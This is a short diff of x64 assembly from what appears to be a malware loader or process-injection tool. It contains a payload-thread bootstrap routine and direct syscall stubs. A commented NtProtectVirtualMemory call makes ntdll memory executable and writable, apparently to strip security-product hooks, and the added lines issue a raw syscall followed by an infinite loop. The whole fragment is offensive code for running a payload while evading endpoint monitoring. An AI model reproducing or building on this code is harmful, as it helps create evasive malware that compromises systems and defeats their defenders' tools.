@@ -54,10 +54,12 @@ isamd64:
 	sub rsp, 20h
 	;lea rcx, NtSuspendProcess ;(this is Not pic code!)
 	;int 3
-
+	;or r10,-1
+	;mov eax, 161h
 	call fpCreatePayloadThread
-
-
+	;syscall
+	;looooop:
+	;jmp looooop
 
 	add rsp, 20h
 	pop r9
@@ -157,6 +159,10 @@ ntProtectVirtMemNumber ENDP
 	call syscallStub
 	add rsp, 50h
 	;status = NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, PAGE_EXECUTE_READWRITE, &oldHookProtect);
+	;int 3
+	or r10,-1
+	mov eax, 161h
+	syscall
 loooop:
 	jmp loooop
 bootstrapRoutineEnd PROC
